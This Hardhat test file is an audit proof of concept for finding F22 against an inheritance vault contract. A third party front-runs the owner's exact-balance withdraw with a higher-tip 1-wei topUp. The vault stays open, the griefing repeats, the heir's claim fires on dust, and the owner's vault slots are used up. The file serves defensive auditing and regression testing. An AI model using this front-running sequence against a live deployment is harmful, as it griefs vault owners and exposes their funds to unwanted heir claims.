// v1 evidence suite (audit/2026-09-preliminary). Ported from the audit PoC sandbox poc/F22/test/poc-F22.ts.
// Contract under test: contracts/v1/InheritanceVaultV1.sol (the deployed v1 source, renamed). See ../README.md.
/**
 * PoC for audit finding F22 (LOW, griefing):
 *   "A third party can front-run an owner's exact-balance 'close' with a 1-wei topUp and keep
 *    the vault open."
 *
 * contracts/InheritanceVault.sol
 *   :441-454 topUp    -- permissionless while ACTIVE, any amount >= 1 wei
 *   :552-580 withdraw -- closes only when `v.balance == 0` AFTER subtracting the exact `amount`
 * site/assets/app.js:215-224 actWithdraw -- prompts for an amount; there is no "withdraw all"
 *
 * The mempool is simulated with automine off: the owner (Alice) broadcasts first with a low tip,
 * the griefer (Dave) sees it and broadcasts a 1-wei topUp with a higher tip, and one block is
 * mined. Explicit gas limits are passed so neither transaction is estimated against the other's
 * pending state (which would make the setup, not the contract, decide the outcome).
 *
 * Test 1 asserts the SAFE property and FAILS against the current code: an owner who asks to close
 * a vault ends up with a closed vault even when a stranger front-runs with dust. It is written to
 * become a regression test: if the contract gains a close-all primitive (a `close(uint256,address)`
 * function, or `withdraw(id, type(uint256).max, to)` as "withdraw everything and close"), the test
 * uses it; otherwise it falls back to the only close path that exists today, withdraw(observed
 * balance), which is exactly what the dapp sends.
 *
 * Test 2 quantifies the damage against the current code (it passes today and documents behaviour).
 */
import { expect } from "chai";
import { ethers, network } from "hardhat";
import { loadFixture, mine, time } from "@nomicfoundation/hardhat-network-helpers";

const DAY = 86_400;
const PERIOD = 30 * DAY;
const WINDOW = 14 * DAY;
const NATIVE = ethers.ZeroAddress;
const DEPOSIT = ethers.parseEther("10");
const FEE_BPS = 50;
const STATE_ACTIVE = 1n;
const STATE_CLAIM_PENDING = 2n;
const STATE_CLOSED = 4n;
const GAS = 400_000n;

// Owner's close transaction: ordinary 1 gwei tip. Griefer: 50 gwei tip, so it is ordered first.
const LOW_TIP = { maxPriorityFeePerGas: ethers.parseUnits("1", "gwei"), maxFeePerGas: ethers.parseUnits("100", "gwei"), gasLimit: GAS };
const HIGH_TIP = { maxPriorityFeePerGas: ethers.parseUnits("50", "gwei"), maxFeePerGas: ethers.parseUnits("100", "gwei"), gasLimit: GAS };

describe("PoC F22: 1-wei topUp front-run defeats an exact-balance close", () => {
  // Evidence-suite port: start from a fresh chain, as this PoC did alone in its audit sandbox. In the
  // combined audit:v1 run, earlier files leave state behind (nonces, balances, deployments, block time).
  before(async () => {
    await (await import("@nomicfoundation/hardhat-network-helpers")).reset();
  });

  async function fixture() {
    const [admin, alice, bob, carol, dave, feeSink] = await ethers.getSigners();
    // Evidence-suite port: pinned to v1 (the sandbox's F22_IMPL fix-sketch switch is not carried over).
    const Vault = await ethers.getContractFactory("InheritanceVaultV1", admin);
    const vault = await Vault.deploy(admin.address, FEE_BPS, feeSink.address);
    const horizon = (await time.latest()) + 730 * DAY;
    await vault
      .connect(alice)
      .createVault(NATIVE, DEPOSIT, bob.address, PERIOD, WINDOW, horizon, { value: DEPOSIT });
    return { vault, admin, alice, bob, carol, dave, feeSink };
  }

  /**
   * Broadcast the owner's "close this vault" transaction, choosing the strongest close primitive
   * the contract offers. Returns the submitted (not yet mined) transaction and the path used.
   */
  async function sendClose(vault: any, owner: any, vaultId: number) {
    let hasClose = false;
    try {
      hasClose = vault.interface.getFunction("close") != null;
    } catch {
      hasClose = false;
    }
    if (hasClose) {
      return { tx: await vault.connect(owner).close(vaultId, owner.address, LOW_TIP), path: "close()" };
    }
    // Does withdraw accept type(uint256).max as "everything, and close"? Probed with a static
    // call against the current (pre-front-run) state; the current contract reverts
    // InsufficientBalance here because it has no such sentinel.
    let sentinel = false;
    try {
      await vault.connect(owner).withdraw.staticCall(vaultId, ethers.MaxUint256, owner.address);
      sentinel = true;
    } catch {
      sentinel = false;
    }
    if (sentinel) {
      return {
        tx: await vault.connect(owner).withdraw(vaultId, ethers.MaxUint256, owner.address, LOW_TIP),
        path: "withdraw(max)",
      };
    }
    // The only close path in the current contract and the one site/assets/app.js actWithdraw
    // sends: withdraw exactly the balance the owner can see right now.
    const seen = (await vault.getVault(owner.address, vaultId)).balance;
    return { tx: await vault.connect(owner).withdraw(vaultId, seen, owner.address, LOW_TIP), path: "withdraw(balance)" };
  }

  it("SAFE PROPERTY: an owner's close is not defeated by a third party's 1-wei front-run topUp", async () => {
    const f = await loadFixture(fixture);

    await network.provider.send("evm_setAutomine", [false]);
    let closeTx: any, griefTx: any, path: string;
    try {
      // 1. Alice broadcasts her close.
      ({ tx: closeTx, path } = await sendClose(f.vault, f.alice, 0));
      // 2. Dave sees it in the mempool and outbids it with a 1-wei topUp.
      griefTx = await f.vault.connect(f.dave).topUp(f.alice.address, 0, 1n, { value: 1n, ...HIGH_TIP });
      // 3. One block is produced containing both.
      await mine();
    } finally {
      await network.provider.send("evm_setAutomine", [true]);
    }

    const griefRcpt = await ethers.provider.getTransactionReceipt(griefTx.hash);
    const closeRcpt = await ethers.provider.getTransactionReceipt(closeTx.hash);
    // Setup sanity, so a failure below cannot be a mis-built scenario: both landed in the same
    // block, Dave's first, and Dave's topUp succeeded.
    expect(griefRcpt!.blockNumber, "same block").to.equal(closeRcpt!.blockNumber);
    expect(griefRcpt!.index, "griefer ordered first").to.be.lessThan(closeRcpt!.index);
    expect(griefRcpt!.status, "griefer topUp succeeded").to.equal(1);
    // Alice's close was mined and did not revert: she has a green receipt.
    expect(closeRcpt!.status, `owner's close via ${path} was mined successfully`).to.equal(1);

    // THE PROPERTY: the vault Alice asked to close is closed.
    const v = await f.vault.getVault(f.alice.address, 0);
    expect(
      v.state,
      `vault must be CLOSED after the owner's close (path: ${path}); a 1-wei front-run left it in state ${v.state}`,
    ).to.equal(STATE_CLOSED);
    expect(v.balance, "no dust left locked in the vault").to.equal(0n);
    expect((await f.vault.openVaultIds(f.alice.address)).length, "open slot released").to.equal(0);
    expect(await f.vault.totalLocked(NATIVE), "locked lane empty").to.equal(0n);
    // Everything, including the griefer's wei, went to the owner's credit.
    expect(await f.vault.creditOf(NATIVE, f.alice.address)).to.equal(DEPOSIT + 1n);
  });

  it("DAMAGE (current behaviour): green receipt, vault stays open, repeatable, heir claim flow fires on dust", async () => {
    const f = await loadFixture(fixture);

    // ---- round 1: Alice's exact-balance close (what the dapp sends) vs Dave's 1-wei topUp
    await network.provider.send("evm_setAutomine", [false]);
    let w1: any, g1: any;
    try {
      w1 = await f.vault.connect(f.alice).withdraw(0, DEPOSIT, f.alice.address, LOW_TIP);
      g1 = await f.vault.connect(f.dave).topUp(f.alice.address, 0, 1n, { value: 1n, ...HIGH_TIP });
      await mine();
    } finally {
      await network.provider.send("evm_setAutomine", [true]);
    }
    const w1r = await ethers.provider.getTransactionReceipt(w1.hash);
    const g1r = await ethers.provider.getTransactionReceipt(g1.hash);
    expect(g1r!.index).to.be.lessThan(w1r!.index);
    expect(w1r!.status).to.equal(1); // the owner's transaction "succeeded"
    await expect(w1)
      .to.emit(f.vault, "Withdrawn")
      .withArgs(f.alice.address, 0, f.alice.address, DEPOSIT, false); // closed = false

    const blockTs = BigInt((await ethers.provider.getBlock(w1r!.blockNumber))!.timestamp);
    let v = await f.vault.getVault(f.alice.address, 0);
    expect(v.state).to.equal(STATE_ACTIVE);
    expect(v.balance).to.equal(1n);
    expect(v.deadline).to.equal(blockTs + BigInt(PERIOD)); // clock reset by the withdraw
    expect(await f.vault.openVaultIds(f.alice.address)).to.deep.equal([0n]);
    expect(await f.vault.totalLocked(NATIVE)).to.equal(1n);
    expect(await f.vault.creditOf(NATIVE, f.alice.address)).to.equal(DEPOSIT);

    // ---- round 2: Alice retries with withdraw(1); Dave repeats the front-run for another wei
    await network.provider.send("evm_setAutomine", [false]);
    let w2: any, g2: any;
    try {
      w2 = await f.vault.connect(f.alice).withdraw(0, 1n, f.alice.address, LOW_TIP);
      g2 = await f.vault.connect(f.dave).topUp(f.alice.address, 0, 1n, { value: 1n, ...HIGH_TIP });
      await mine();
    } finally {
      await network.provider.send("evm_setAutomine", [true]);
    }
    const w2r = await ethers.provider.getTransactionReceipt(w2.hash);
    const g2r = await ethers.provider.getTransactionReceipt(g2.hash);
    expect(w2r!.status).to.equal(1);
    await expect(w2).to.emit(f.vault, "Withdrawn").withArgs(f.alice.address, 0, f.alice.address, 1n, false);
    v = await f.vault.getVault(f.alice.address, 0);
    expect(v.state).to.equal(STATE_ACTIVE);
    expect(v.balance).to.equal(1n);
    expect((await f.vault.openVaultIds(f.alice.address)).length).to.equal(1);

    // Cost symmetry: Dave spends 1 wei + one topUp's gas per round; Alice one withdraw's gas.
    console.log(
      `      gas per round -- griefer topUp: ${g1r!.gasUsed} / ${g2r!.gasUsed}, owner withdraw: ${w1r!.gasUsed} / ${w2r!.gasUsed}; griefer value spent: 2 wei`,
    );

    // ---- consequence: the "closed" vault is later reported expired and the heir can claim it
    await time.increase(PERIOD + 1);
    expect((await f.vault.warningsOf(f.alice.address, 0)) & 1n).to.equal(1n); // expired alert bit
    await f.vault.connect(f.bob).initiateClaim(f.alice.address, 0, f.bob.address);
    expect((await f.vault.getVault(f.alice.address, 0)).state).to.equal(STATE_CLAIM_PENDING);

    // ---- consequence: the dust vault holds one of Alice's MAX_OPEN_VAULTS (32) slots
    const horizon = (await time.latest()) + 730 * DAY;
    for (let i = 0; i < 31; i++) {
      await f.vault
        .connect(f.alice)
        .createVault(NATIVE, 1n, f.bob.address, PERIOD, WINDOW, horizon, { value: 1n });
    }
    await expect(
      f.vault.connect(f.alice).createVault(NATIVE, 1n, f.bob.address, PERIOD, WINDOW, horizon, { value: 1n }),
    )
      .to.be.revertedWithCustomError(f.vault, "TooManyOpenVaults")
      .withArgs(32);
  });
});
